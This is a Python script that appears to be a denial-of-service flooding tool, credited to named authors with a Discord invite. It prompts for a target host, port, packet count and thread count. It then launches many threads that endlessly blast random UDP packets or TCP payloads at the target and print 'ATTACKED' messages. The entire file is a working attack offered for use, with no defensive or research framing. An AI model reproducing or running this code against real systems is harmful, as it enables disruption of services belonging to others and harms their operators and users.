#!/usr/bin/env python3
import random
import socket
import threading
import os

os.system("clear")
print("""\x1b[1;92m
#                #          #           ########       #                  #
#               #          #           #                 #       #                  #
#              #          #           #                 #       #                 #
#    ##    #          #           ########         #                 #
#  #  #   #          #           #                  #       #                 #
# #   # #           #           #                  #        #                #
# #  ##            #           #########         ########
""")

print       (" - - > TOOLS INFORMATION < - - ")
print       (" - - > CREATOR : Rexzy & WillardZy < - - ")
print       (" - - > DISCORD : RexZy<- - ")                                   
print       (" - - > DM ME IF YOU NEED HELP < - - ")
print       (" - - > DISCORD SERVER < - - ")
print       (" - - > https://discord.gg/kaHyyKZQ < - - ")


ip = str(input("  HOST/IP:"))
port = int(input(" Port:"))
choice = str(input(" Gass Ndak?(y/n):"))
times = int(input(" Packets :"))
threads = int(input(" Threads :"))
os.system("clear")
def run():
	data = random._urandom(1800)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" REXZY ATTACKED IP%s AND THROUGH THE PORT%s"%(ip,port))
		except:
			print("[!] ERROR SERVER TIME OUT")

def run2():
	data = random._urandom(18)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" REXZY ATTACKED IP%s AND THROUGH THE PORT%s"%(ip,port))
		except:
			s.close()
			print("[*] ERROR SERVER TIME OUT")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
